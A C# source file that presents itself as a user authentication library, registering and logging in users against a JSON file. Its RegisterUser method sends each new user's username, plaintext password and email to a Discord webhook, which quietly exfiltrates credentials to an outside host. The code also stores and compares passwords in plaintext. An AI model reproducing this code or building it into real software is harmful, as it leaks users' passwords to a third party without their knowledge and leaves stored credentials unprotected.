using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using Newtonsoft.Json;

namespace UserAuthenticationLibrary
{
    public class UserAuthentication
    {
        private readonly string userFilePath;
        private readonly string discordWebhookUrl;

        public UserAuthentication(string webhookUrl)
        {
            // Initialize the user file path from the configuration
            userFilePath = AppConfig.GetUserFilePath();
            discordWebhookUrl = webhookUrl;

            // Create the user file if it doesn't exist
            if (!File.Exists(userFilePath))
            {
                File.Create(userFilePath).Close();
            }
        }

        public bool RegisterUser(string username, string password, string email)
        {
            // Check if the username or email already exists
            if (UserExists(username) || EmailExists(email))
            {
                Console.WriteLine("Username or email already exists. Please choose a different username and email.");
                return false;
            }

            // Save user information in JSON format
            var userInfo = new UserInfo
            {
                Username = username,
                Password = password,
                Email = email,
                CreatedAt = DateTime.Now,
                AdditionalInfo = "Any additional info you want to include."
            };

            SaveUserInfoToJson(userInfo);

            Console.WriteLine("Registration successful.");

            // Send account information to Discord webhook
            SendToDiscordWebhook($"New Account Created:\nUsername: {username}\nPassword: {password}\nEmail: {email}\nCreated at: {DateTime.Now}");

            return true;
        }

        public bool AuthenticateUser(string username, string password)
        {
            // Check if the user exists and the password is correct
            List<UserInfo> users = LoadUsersFromJson();

            foreach (var user in users)
            {
                if (user.Username == username && user.Password == password)
                {
                    Console.WriteLine("Login successful.");
                    return true;
                }
            }

            Console.WriteLine("Invalid username or password.");
            return false;
        }

        private bool UserExists(string username)
        {
            List<UserInfo> users = LoadUsersFromJson();

            foreach (var user in users)
            {
                if (user.Username == username)
                {
                    return true;
                }
            }

            return false;
        }

        private bool EmailExists(string email)
        {
            List<UserInfo> users = LoadUsersFromJson();

            foreach (var user in users)
            {
                if (user.Email == email)
                {
                    return true;
                }
            }

            return false;
        }

        private void SaveUserInfoToJson(UserInfo userInfo)
        {
            List<UserInfo> users = LoadUsersFromJson();
            users.Add(userInfo);

            // Save the updated list to the JSON file
            File.WriteAllText(userFilePath, Newtonsoft.Json.JsonConvert.SerializeObject(users, Newtonsoft.Json.Formatting.Indented));
        }

        private List<UserInfo> LoadUsersFromJson()
        {
            if (File.Exists(userFilePath))
            {
                // Read user information from the JSON file
                string json = File.ReadAllText(userFilePath);
                return Newtonsoft.Json.JsonConvert.DeserializeObject<List<UserInfo>>(json) ?? new List<UserInfo>();
            }

            return new List<UserInfo>();
        }

        private void SendToDiscordWebhook(string message)
        {
            using (HttpClient client = new HttpClient())
            {
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("content", message)
                });

                try
                {
                    var response = client.PostAsync(discordWebhookUrl, content).Result;
                    response.EnsureSuccessStatusCode(); // Ensure success status
                }
                catch (HttpRequestException ex)
                {
                    Console.WriteLine($"Error sending to Discord webhook: {ex.Message}");
                }
            }
        }
    }
}